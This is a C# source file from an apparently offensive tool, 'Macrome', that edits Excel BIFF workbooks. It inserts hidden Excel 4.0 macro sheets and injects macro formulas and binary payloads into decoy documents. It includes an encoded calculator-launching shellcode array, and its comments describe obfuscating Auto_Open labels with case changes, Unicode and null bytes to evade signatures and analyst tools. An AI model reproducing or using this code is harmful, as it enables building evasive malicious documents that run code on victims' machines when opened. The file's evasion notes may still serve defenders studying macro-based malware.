using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.StructuredStorage.Reader;
using b2xtranslator.xls.XlsFileFormat.Records;

namespace Macrome
{
    public class WorkbookEditor
    {
        public WorkbookStream WbStream;

        public WorkbookEditor(byte[] workbookBytes)
        {
            WbStream = new WorkbookStream(workbookBytes);
        }

        public WorkbookEditor(WorkbookStream wbs)
        {
            WbStream = wbs;
        }

        private BoundSheet8 BuildBoundSheetFromBytes(byte[] bytes)
        {
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                VirtualStreamReader vsr = new VirtualStreamReader(ms);
                RecordType id = (RecordType)vsr.ReadUInt16();
                ushort len = vsr.ReadUInt16();
                return new BoundSheet8(vsr, id, len);
            }
        }

        public WorkbookStream InsertBoundSheetRecord(BoundSheet8 boundSheet8)
        {
            List<BiffRecord> records = WbStream.Records;

            List<BoundSheet8> sheets = records.Where(r => r.Id == RecordType.BoundSheet8).Select(sheet => BuildBoundSheetFromBytes(sheet.GetBytes())).ToList();
            
            boundSheet8.lbPlyPos = sheets.First().lbPlyPos;
            sheets.Add(boundSheet8);

            foreach (var sheet in sheets)
            {
                sheet.lbPlyPos += boundSheet8.Length;
            }


            var preSheetRecords = records.TakeWhile(r => r.Id != RecordType.BoundSheet8);
            var postSheetRecords = records.SkipWhile(r => r.Id != RecordType.BoundSheet8)
                .SkipWhile(r => r.Id == RecordType.BoundSheet8);

            List<BiffRecord> newRecordList = preSheetRecords.Concat(sheets).Concat(postSheetRecords).ToList();

            WorkbookStream newStream = new WorkbookStream(newRecordList);

            WbStream = newStream;

            return WbStream;
        }

        public WorkbookStream AddMacroSheet(List<BiffRecord> macroSheetRecords, string sheetName, BoundSheet8.HiddenState hiddenState = BoundSheet8.HiddenState.Visible)
        {
            BoundSheet8 macroBoundSheet = new BoundSheet8(hiddenState, BoundSheet8.SheetType.Macrosheet, sheetName);
            WbStream = WbStream.AddSheet(macroBoundSheet, macroSheetRecords);
            return WbStream;
        }

        private byte[] GetPopCalcShellcode()
        {
            byte[] buf = new byte[448] {
0x89,0xe7,0xda,0xc8,0xd9,0x77,0xf4,0x5d,0x55,0x59,0x49,0x49,0x49,0x49,0x49,
0x49,0x49,0x49,0x49,0x49,0x43,0x43,0x43,0x43,0x43,0x43,0x37,0x51,0x5a,0x6a,
0x41,0x58,0x50,0x30,0x41,0x30,0x41,0x6b,0x41,0x41,0x51,0x32,0x41,0x42,0x32,
0x42,0x42,0x30,0x42,0x42,0x41,0x42,0x58,0x50,0x38,0x41,0x42,0x75,0x4a,0x49,
0x4b,0x4c,0x48,0x68,0x4d,0x52,0x73,0x30,0x57,0x70,0x55,0x50,0x43,0x50,0x4b,
0x39,0x7a,0x45,0x54,0x71,0x4f,0x30,0x53,0x54,0x6e,0x6b,0x46,0x30,0x54,0x70,
0x4e,0x6b,0x72,0x72,0x54,0x4c,0x4e,0x6b,0x31,0x42,0x36,0x74,0x4e,0x6b,0x30,
0x72,0x65,0x78,0x76,0x6f,0x38,0x37,0x70,0x4a,0x57,0x56,0x55,0x61,0x59,0x6f,
0x6e,0x4c,0x67,0x4c,0x75,0x31,0x63,0x4c,0x74,0x42,0x34,0x6c,0x51,0x30,0x5a,
0x61,0x48,0x4f,0x64,0x4d,0x56,0x61,0x4a,0x67,0x49,0x72,0x4b,0x42,0x71,0x42,
0x70,0x57,0x6c,0x4b,0x53,0x62,0x34,0x50,0x6c,0x4b,0x72,0x6a,0x77,0x4c,0x6c,
0x4b,0x30,0x4c,0x72,0x31,0x50,0x78,0x58,0x63,0x43,0x78,0x76,0x61,0x6e,0x31,
0x42,0x71,0x4e,0x6b,0x56,0x39,0x31,0x30,0x65,0x51,0x7a,0x73,0x4e,0x6b,0x31,
0x59,0x57,0x68,0x49,0x73,0x74,0x7a,0x67,0x39,0x4c,0x4b,0x34,0x74,0x4e,0x6b,
0x45,0x51,0x7a,0x76,0x36,0x51,0x4b,0x4f,0x6c,0x6c,0x39,0x51,0x4a,0x6f,0x74,
0x4d,0x63,0x31,0x78,0x47,0x55,0x68,0x6d,0x30,0x51,0x65,0x68,0x76,0x45,0x53,
0x61,0x6d,0x6c,0x38,0x67,0x4b,0x63,0x4d,0x76,0x44,0x71,0x65,0x4d,0x34,0x42,
0x78,0x6c,0x4b,0x32,0x78,0x34,0x64,0x43,0x31,0x49,0x43,0x63,0x56,0x4c,0x4b,
0x66,0x6c,0x72,0x6b,0x6c,0x4b,0x50,0x58,0x77,0x6c,0x36,0x61,0x4e,0x33,0x6e,
0x6b,0x35,0x54,0x4e,0x6b,0x77,0x71,0x58,0x50,0x6c,0x49,0x30,0x44,0x55,0x74,
0x75,0x74,0x51,0x4b,0x61,0x4b,0x53,0x51,0x31,0x49,0x42,0x7a,0x76,0x31,0x6b,
0x4f,0x6d,0x30,0x73,0x6f,0x61,0x4f,0x62,0x7a,0x6e,0x6b,0x44,0x52,0x78,0x6b,
0x4c,0x4d,0x73,0x6d,0x33,0x5a,0x33,0x31,0x4e,0x6d,0x4e,0x65,0x78,0x32,0x67,
0x70,0x77,0x70,0x35,0x50,0x36,0x30,0x75,0x38,0x45,0x61,0x4e,0x6b,0x30,0x6f,
0x6f,0x77,0x79,0x6f,0x4e,0x35,0x4f,0x4b,0x69,0x70,0x67,0x6d,0x37,0x5a,0x76,
0x6a,0x52,0x48,0x4e,0x46,0x6d,0x45,0x4d,0x6d,0x6f,0x6d,0x69,0x6f,0x4a,0x75,
0x77,0x4c,0x34,0x46,0x33,0x4c,0x36,0x6a,0x6d,0x50,0x79,0x6b,0x49,0x70,0x73,
0x45,0x34,0x45,0x4d,0x6b,0x33,0x77,0x66,0x73,0x61,0x62,0x32,0x4f,0x43,0x5a,
0x77,0x70,0x36,0x33,0x4b,0x4f,0x38,0x55,0x62,0x43,0x55,0x31,0x62,0x4c,0x43,
0x53,0x54,0x6e,0x35,0x35,0x62,0x58,0x50,0x65,0x33,0x30,0x41,0x41 };
            return buf;
        }
        public WorkbookStream SetMacroSheetContent(List<string> macroStrings, byte[] binaryPayload = null)
        {
            List<BoundSheet8> sheets = WbStream.GetAllRecordsByType<BoundSheet8>();
            int macroSheetIndex = sheets.TakeWhile(sheet => sheet.dt != BoundSheet8.SheetType.Macrosheet).Count();
            string macroSheetName = sheets.Skip(macroSheetIndex).First().stName.Value;
            BOF macroBof = WbStream.GetAllRecordsByType<BOF>().Skip(macroSheetIndex + 1).First();
            List<BiffRecord> macroRecords = WbStream.GetRecordsForBOFRecord(macroBof);

            WorkbookStream macroStream = new WorkbookStream(macroRecords);
            List<Formula> macroFormulas = macroStream.GetAllRecordsByType<Formula>();
            int numRecordsInSheet = macroFormulas.Count;

            


            

            List<BiffRecord> formulasToAdd = FormulaHelper.ConvertStringsToRecords(macroStrings, numRecordsInSheet - 1, 0, 0, 1);

            if (binaryPayload != null)
            {
                List<string> payload = FormulaHelper.BuildPayloadMacros(binaryPayload);
                formulasToAdd.AddRange(FormulaHelper.ConvertStringsToRecords(payload, numRecordsInSheet - 1 + formulasToAdd.Count, 0, 0, 2));
            }
            

            Formula haltFormula = macroFormulas.Last();
            Formula modifiedHaltFormula = ((BiffRecord)haltFormula.Clone()).AsRecordType<Formula>();
            modifiedHaltFormula.rw = (ushort)(numRecordsInSheet - 1 + formulasToAdd.Count);

            Formula gotoFormula = FormulaHelper.GetGotoFormulaForCell(modifiedHaltFormula.rw, modifiedHaltFormula.col, 0, 1);

            WorkbookStream modifiedStream = WbStream.InsertRecords(formulasToAdd, haltFormula);
            modifiedStream = modifiedStream.ReplaceRecord(haltFormula, gotoFormula);

            WbStream = modifiedStream;
            return WbStream;
        }

        public WorkbookStream AddLabel(string label, int rw, int col)
        {
            /*
             * Labels require a reference to an XTI index which is used to say which
             * BoundSheet8 record maps to the appropriate tab. In order to make this
             * record we need a SupBook record, and ExternSheet record to specify
             * which BoundSheet8 record to use.
             *
             * Currently this assumes there are no SupBook or ExternSheet records in
             * use, handling of these cases for complex decoy docs is coming
             * in the future.
             *
             * TODO handle existing SupBook/ExternSheet records when adding Lbl entries
             */

            List<BoundSheet8> sheets = WbStream.GetAllRecordsByType<BoundSheet8>();
            List<SupBook> supBooksExisting = WbStream.GetAllRecordsByType<SupBook>();
            List<ExternSheet> externSheetsExisting = WbStream.GetAllRecordsByType<ExternSheet>();

            if (supBooksExisting.Count > 0 || externSheetsExisting.Count > 0)
            {
                throw new NotImplementedException("Use a Decoy Document with no Labels");
            }

            BiffRecord lastCountryRecord = WbStream.GetAllRecordsByType<Country>().Last();

            SupBook supBookRecord = new SupBook(sheets.Count, 0x401);
            int macroOffset = sheets.TakeWhile(s => s.dt != BoundSheet8.SheetType.Macrosheet).Count();
            ExternSheet externSheetRecord = new ExternSheet(1, new List<XTI>() {new XTI(0, macroOffset, macroOffset) });

            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
            ptgStack.Push(new PtgRef3d(rw, col, 0));
            Lbl newLbl = new Lbl(label, 0);
            newLbl.SetRgce(ptgStack);

            WbStream = WbStream.InsertRecord(supBookRecord, lastCountryRecord);
            WbStream = WbStream.InsertRecord(externSheetRecord, supBookRecord);
            WbStream = WbStream.InsertRecord(newLbl, externSheetRecord);
            WbStream = WbStream.FixBoundSheetOffsets();

            return WbStream;
        }


        /// <summary>
        /// We use a few tricks here to obfuscate the Auto_Open Lbl BIFF records.
        /// 1) By default the Lbl Auto_Open record is marked as fBuiltin = true with a single byte 0x01 to represent AUTO_OPEN
        ///    We avoid this easily sig-able series of bytes by using a string instead - which Excel will also process.
        ///    We can use labels like AuTo_OpEn and Excel will still use it - some analyst tools are case sensitive and don't
        ///    detect this.
        /// 2) The string we use for the Lbl can be Unicode, which will further break signatures expecting an ASCII Auto_Open string
        /// 3) We can inject null bytes into the label name and Excel will ignore them when hunting for Auto_Open labels.
        ///    The name manager will only display up to the first null byte - and most excel label parsers will also break on this.
        /// </summary>
        /// <returns></returns>
        public WorkbookStream ObfuscateAutoOpen()
        {
            WbStream = WbStream.ObfuscateAutoOpen();
            return WbStream;
        }


        public byte[] InsertWorksheet(byte[] workbook, byte[] worksheet)
        {
            // return workbook;
            throw new NotImplementedException();
        }



    }
}
